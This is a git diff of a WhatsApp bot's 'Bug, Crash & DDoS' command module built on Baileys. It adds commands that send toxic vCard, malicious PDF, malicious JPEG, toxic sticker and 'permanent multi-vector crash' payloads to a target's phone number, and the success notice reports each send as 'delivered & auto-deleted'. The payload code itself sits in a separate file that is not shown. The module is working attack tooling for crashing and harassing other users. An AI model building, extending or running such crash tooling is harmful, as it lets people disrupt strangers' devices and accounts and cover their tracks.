@@ -1,6 +1,6 @@
 // ─────────────────────────────────────────────
 //  Al-Jin · modules/xeon-commands.js
-//  Bug, Crash & DDoS command module (Native Baileys v7)
+//  Bug, Crash & DDoS command module (Native Baileys v7 + Binary Vectors)
 // ─────────────────────────────────────────────
 import { spawn } from 'node:child_process';
 import path from 'node:path';
@@ -16,6 +16,10 @@ import {
   sendXdelayPayload,
   sendIosInvisiblePayload,
   sendPermanentCrashPayload,
+  sendToxicVCardPayload,
+  sendMaliciousPDFPayload,
+  sendMaliciousJPEGPayload,
+  sendToxicStickerPayload,
   isProtectedJid
 } from '../lib/bug-payloads.js';
 
@@ -35,7 +39,7 @@ function notifySending(sock, chat, target, cmdName = 'BUG') {
 
 async function notifyResult(sock, chat, target, cmdName, result, quotedMsg) {
   if (result && result.success) {
-    const text = `┏━━━━━━〣 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ 📦 Status  : DELIVERED\n┃ 📬 Packets : ${result.deliveredCount || 1} delivered\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
+    const text = `┏━━━━━━〣 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ 📦 Status  : DELIVERED & AUTO-DELETED\n┃ 📬 Packets : ${result.deliveredCount || 1} delivered\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
     return sock.sendMessage(chat, { text }, { quoted: quotedMsg });
   } else {
     const errReason = result?.errors?.[0] || 'Payload delivery rejected by target server/device';
@@ -57,7 +61,7 @@ async function checkWhatsAppUser(sock, cleanTarget) {
 }
 
 // ─────────────────────────────────────────────
-// Existing Commands (Refactored to Native Baileys v7)
+// Commands (Native Baileys v7 + Binary Crash Payloads)
 // ─────────────────────────────────────────────
 
 export async function crashjamCommand(sock, chat, msg, args) {
@@ -149,7 +153,7 @@ export async function stickercrashCommand(sock, chat, msg, args) {
     if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });
 
     await notifySending(sock, chat, cleanTarget, 'stickercrash');
-    const res = await sendStickerCrashPayload(sock, targetJid);
+    const res = await sendToxicStickerPayload(sock, targetJid);
     await notifyResult(sock, chat, cleanTarget, 'stickercrash', res, msg);
   } catch (err) {
     await notifyResult(sock, chat, cleanTarget, 'stickercrash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
@@ -320,16 +324,12 @@ export async function testCommand(sock, chat, msg, args) {
 
   try {
     await notifySending(sock, chat, cleanTarget, 'test');
-    const res = await sendAIRichAddonAction(sock, targetJid);
+    const res = await sendToxicVCardPayload(sock, targetJid);
     await notifyResult(sock, chat, cleanTarget, 'test', res, msg);
   } catch (err) {
     await notifyResult(sock, chat, cleanTarget, 'test', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
   }
 }
-
-// ─────────────────────────────────────────────
-// New Commands Required in plan.txt (.kill, .crash, .permanent)
-// ─────────────────────────────────────────────
 
 export async function killCommand(sock, chat, msg, args) {
   if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
@@ -364,7 +364,7 @@ export async function crashCommand(sock, chat, msg, args) {
 
   try {
     await notifySending(sock, chat, targetArg, 'crash');
-    const res = await sendAIRichAddonAction(sock, targetJid);
+    const res = await sendPermanentCrashPayload(sock, targetJid);
     await notifyResult(sock, chat, targetArg, 'crash', res, msg);
   } catch (err) {
     await notifyResult(sock, chat, targetArg, 'crash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
@@ -383,7 +383,7 @@ export async function permanentCommand(sock, chat, msg, args) {
   }
 
   try {
-    await notifySending(sock, chat, targetArg, 'permanent crash');
+    await notifySending(sock, chat, targetArg, 'permanent multi-vector crash');
     const res = await sendPermanentCrashPayload(sock, targetJid);
     await notifyResult(sock, chat, targetArg, 'permanent crash', res, msg);
   } catch (err) {
